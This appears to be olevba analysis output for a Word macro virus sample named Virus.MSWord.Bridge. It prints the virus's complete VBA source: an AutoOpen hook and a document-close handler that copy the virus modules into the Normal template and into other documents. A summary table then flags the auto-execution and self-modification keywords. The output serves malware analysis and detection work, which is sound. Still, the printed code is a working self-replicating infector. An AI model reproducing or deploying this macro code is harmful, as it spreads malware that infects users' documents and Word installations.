olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bridge
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bridge - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MdCont.bas 
in file: Virus.MSWord.Bridge - OLE stream: 'Macros/VBA/MdCont'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Vcol As New Contec
Sub AutoOpen()
    Set Vcol.Acol = Word.ActiveDocument
End Sub

-------------------------------------------------------------------------------
VBA MACRO Contec.cls 
in file: Virus.MSWord.Bridge - OLE stream: 'Macros/VBA/Contec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents Acol As Word.Document
Private Sub Acol_Close()
      'On Error Resume Next
      
      Dim wDocu, wPlan As Object
      Dim infewnd, infewdo As Boolean
 
      Set wDocu = ActiveDocument.VBProject.VBComponents
      Set wPlan = NormalTemplate.VBProject.VBComponents
      
      infewnd = False
      infewdo = False
      
      nitef = wPlan.Count
      For i = 1 To nitef
          If wPlan.Item(i).Name = "Contec" Then infewnd = True
      Next
      If infewnd = False Then
          NormalTemplate.Saved = False
          NormalTemplate.VBProject.VBComponents.Add 1
          nitef = wPlan.Count
          wPlan.Item(nitef).Name = "MdCont"
          NormalTemplate.VBProject.VBComponents.Add 2
          nitef = wPlan.Count
          wPlan.Item(nitef).Name = "Contec"
          conteinivir = "Dim Vcol As New Contec" & Chr(13) & "Sub AutoOpen()" & Chr(13) & "    Set Vcol.Acol = Word.ActiveDocument" & Chr(13) & "End Sub" & Chr(13)
          wPlan.Item("MdCont").CodeModule.AddFromString conteinivir
          contco = wDocu.Item("Contec").CodeModule.Lines(1, wDocu.Item("Contec").CodeModule.CountOfLines)
          wPlan.Item("Contec").CodeModule.AddFromString contco
      End If
      
      nitef = wDocu.Count
      For i = 1 To nitef
          If wDocu.Item(i).Name = "Contec" Then infewdo = True
      Next
      If infewdo = False And ActiveDocument.Name <> NormalTemplate.Name Then
          ActiveDocument.Saved = False
          ActiveDocument.VBProject.VBComponents.Add 2
          nitef = wDocu.Count
          wDocu.Item(nitef).Name = "Contec"
          ActiveDocument.VBProject.VBComponents.Add 1
          nitef = wDocu.Count
          wDocu.Item(nitef).Name = "MdCont"
          conteinivir = "Dim Vcol As New Contec" & Chr(13) & "Sub AutoOpen()" & Chr(13) & "    Set Vcol.Acol = Word.ActiveDocument" & Chr(13) & "End Sub" & Chr(13)
          wDocu.Item("MdCont").CodeModule.AddFromString conteinivir
          contco = wPlan.Item("Contec").CodeModule.Lines(1, wPlan.Item("Contec").CodeModule.CountOfLines)
          wDocu.Item("Contec").CodeModule.AddFromString contco
      End If

End Sub

Private Sub Acol_Open()
      
      
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

